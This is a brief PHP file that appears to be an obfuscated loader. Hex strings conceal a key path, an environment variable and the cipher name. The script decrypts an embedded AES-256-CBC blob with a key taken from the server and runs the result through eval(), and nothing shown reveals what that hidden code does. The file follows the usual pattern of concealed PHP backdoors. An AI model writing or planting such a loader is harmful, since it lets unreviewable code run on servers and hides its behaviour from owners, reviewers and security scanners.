<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('xWLTcIwWAdn16+/DCZOJIQ==');

$c=base64_decode(

'KUvsRstJOI9p+zgiMXWcXD8mwYqeHZlki8IzfU4uHSKgWdua3rkTQRKLxPrsBYtpjL2aWiUiFf/Y' .
'Yy57N7aa7HEWK0LrJJ+ps57DcF6+HxjMdDSvayM/jb9S0n6F5tHcOt2QVkAEDjWX7AhrslxKzDUq' .
'Ds3istb2u8fx2lob/4Ai9w/WpglCO+T4yjdnanD179CRqVg3t7VOR2xis54uMp4yMb0d2HFsDtpT' .
'EAGFGfehTVGDhT/p6fBOAVXbcqpywUc6yheOUDVt+uuy7MsbJbkMaZcBWDvyPkZtgAZChNBearY3' .
'56geiroxvtgKqylRBPxjaNqpnJW4UeU1ChD5JZpRKBCo4UrqHCBRFp+7HgeVDvshUgs0Bg1X6lTt' .
'IpjmFq/QrHcbxvOiQGV1NvoC+WzpGq2NFVhqXlehmsZg7l+QXBAwWxPiJByBg86c426JIWQ4FMxn' .
'Nr1P4Ktv9df6wJ75CT+uEq1fIZwxHOwO65dG2/JYHt2cMyoc5cRg5Ak4x/DVI6AxNWVzhQKlISiz' .
'hfKsX2+IP8paytltjj98Bag='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

